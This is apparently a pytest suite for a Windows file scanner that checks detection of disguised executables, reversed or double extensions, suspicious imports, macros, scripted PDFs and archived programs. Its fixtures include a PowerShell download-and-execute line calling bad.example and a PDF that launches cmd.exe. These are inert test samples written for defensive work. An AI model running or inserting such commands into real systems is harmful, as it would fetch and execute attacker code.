"""The scanner: a file dropped on the display, read - never run, never
opened with its program - and judged: clean, careful, or do not open it.

What it knows to look for: a program pretending to be a document (by its
first bytes, not its name), a name hiding its real extension, a program's
signature and what it imports, macros in Office files, what a PDF would do
on opening, the commands a script would run, programs inside an archive,
where a download came from - and whatever Windows Defender says of it.
"""
import io
import os
import zipfile

import pytest

import scanner

NOTEPAD = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "notepad.exe")


def quiet(**kw):
    """A scan with Defender and the signature check stood in for."""
    kw.setdefault("defender", lambda path: {"ran": True, "clean": True})
    kw.setdefault("signature", lambda path: {"status": "NotSigned", "signer": ""})
    return kw


def levels(report):
    return [f["level"] for f in report["findings"]]


def write(tmp_path, name, data):
    path = tmp_path / name
    path.write_bytes(data)
    return str(path)


def test_plain_text_is_clean(tmp_path):
    report = scanner.scan(write(tmp_path, "notes.txt", b"milk, eggs, bread\n"), **quiet())
    assert report["verdict"] == "clean"
    assert report["kind"] == "Text"
    assert len(report["sha256"]) == 64 and report["size"] == 18


def test_a_program_pretending_to_be_a_picture_is_dangerous(tmp_path):
    report = scanner.scan(write(tmp_path, "holiday.jpg", b"MZ" + b"\0" * 200), **quiet())
    assert report["verdict"] == "danger"
    assert any(".jpg" in f["text"] and f["level"] == "danger" for f in report["findings"])


def test_a_hidden_second_extension_is_dangerous(tmp_path):
    report = scanner.scan(write(tmp_path, "invoice.pdf.exe", b"MZ" + b"\0" * 200), **quiet())
    assert report["verdict"] == "danger"
    assert any("invoice.pdf" in f["text"] for f in report["findings"])


def test_a_name_turned_backwards_is_dangerous(tmp_path):
    name = "photo\u202egnp.exe"
    report = scanner.scan(write(tmp_path, name, b"MZ" + b"\0" * 200), **quiet())
    assert report["verdict"] == "danger"


def test_a_real_program_is_read(tmp_path):
    report = scanner.scan(NOTEPAD, **quiet(signature=lambda p: {"status": "Valid",
                                                                "signer": "CN=Microsoft Windows"}))
    assert report["kind"].startswith("Windows program")
    pe = report["pe"]
    assert pe["bits"] in (32, 64) and pe["sections"] and pe["imports"] > 10
    assert report["signature"]["status"] == "Valid"
    assert report["verdict"] == "clean", report["findings"]


def test_an_unsigned_program_is_a_caution_and_a_broken_signature_danger(tmp_path):
    unsigned = scanner.scan(NOTEPAD, **quiet())
    assert unsigned["verdict"] == "caution"
    broken = scanner.scan(NOTEPAD, **quiet(signature=lambda p: {"status": "HashMismatch", "signer": "x"}))
    assert broken["verdict"] == "danger"


def test_what_a_program_imports_says_what_it_can_do():
    said = scanner.judge_imports({"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory",
                                                   "CreateRemoteThread"],
                                  "user32.dll": ["SetWindowsHookExW", "GetAsyncKeyState"],
                                  "urlmon.dll": ["URLDownloadToFileW"]})
    text = " ".join(f["text"] for f in said)
    assert "other programs" in text and "keys" in text and "download" in text


def test_windows_defender_finding_something_is_danger(tmp_path):
    report = scanner.scan(write(tmp_path, "a.txt", b"hello"),
                          **quiet(defender=lambda p: {"ran": True, "clean": False,
                                                      "threat": "Trojan:Win32/Test"}))
    assert report["verdict"] == "danger"
    assert "Trojan:Win32/Test" in report["headline"]


def test_defender_answers_are_read():
    assert scanner.parse_defender(0, "Scanning ...\nfound no threats.") == {"ran": True, "clean": True}
    found = scanner.parse_defender(2, "Threat                  : Virus:DOS/EICAR_Test_File\n")
    assert found["clean"] is False and found["threat"] == "Virus:DOS/EICAR_Test_File"
    assert scanner.parse_defender(5, "Access denied")["ran"] is False


def test_office_macros_are_a_caution(tmp_path):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\0VBA")
    report = scanner.scan(write(tmp_path, "report.docm", buffer.getvalue()), **quiet())
    assert report["verdict"] == "caution"
    assert any("macro" in f["text"].lower() for f in report["findings"])


def test_a_pdf_that_runs_things_is_flagged(tmp_path):
    gentle = scanner.scan(write(tmp_path, "a.pdf", b"%PDF-1.7\n1 0 obj << /Type /Catalog >>\n"), **quiet())
    assert gentle["verdict"] == "clean" and gentle["kind"] == "PDF document"
    scripted = scanner.scan(write(tmp_path, "b.pdf", b"%PDF-1.7\n<< /OpenAction << /JavaScript (app.alert(1)) >> >>"),
                            **quiet())
    assert scripted["verdict"] == "caution"
    launching = scanner.scan(write(tmp_path, "c.pdf", b"%PDF-1.7\n<< /Launch << /F (cmd.exe) >> >>"), **quiet())
    assert launching["verdict"] == "danger"


def test_a_script_that_downloads_and_runs_is_dangerous(tmp_path):
    script = b"$c = (New-Object Net.WebClient).DownloadString('http://bad.example/p'); IEX $c\n"
    report = scanner.scan(write(tmp_path, "setup.ps1", script), **quiet())
    assert report["verdict"] == "danger"
    assert "http://bad.example/p" in report["urls"]


def test_a_program_inside_an_archive_is_a_caution(tmp_path):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as z:
        z.writestr("readme.txt", "hi")
        z.writestr("tools/crack.exe", b"MZ" + b"\0" * 64)
    report = scanner.scan(write(tmp_path, "tools.zip", buffer.getvalue()), **quiet())
    assert report["verdict"] == "caution"
    assert any("crack.exe" in f["text"] for f in report["findings"])


def test_where_a_download_came_from(tmp_path):
    path = write(tmp_path, "setup.txt", b"hello")
    try:
        with open(path + ":Zone.Identifier", "w", encoding="utf-8") as stream:
            stream.write("[ZoneTransfer]\nZoneId=3\nHostUrl=https://files.example.com/setup.txt\n")
    except OSError:
        pytest.skip("no alternate data streams here")
    report = scanner.scan(path, **quiet())
    assert report["origin"] == "files.example.com"


def test_a_folder_or_nothing_is_refused(tmp_path):
    assert scanner.scan(str(tmp_path), **quiet())["verdict"] == "error"
    assert scanner.scan(str(tmp_path / "missing.txt"), **quiet())["verdict"] == "error"


def test_every_report_has_a_look_it_up_link(tmp_path):
    report = scanner.scan(write(tmp_path, "a.txt", b"x"), **quiet())
    assert report["lookup"] == f"https://www.virustotal.com/gui/file/{report['sha256']}"
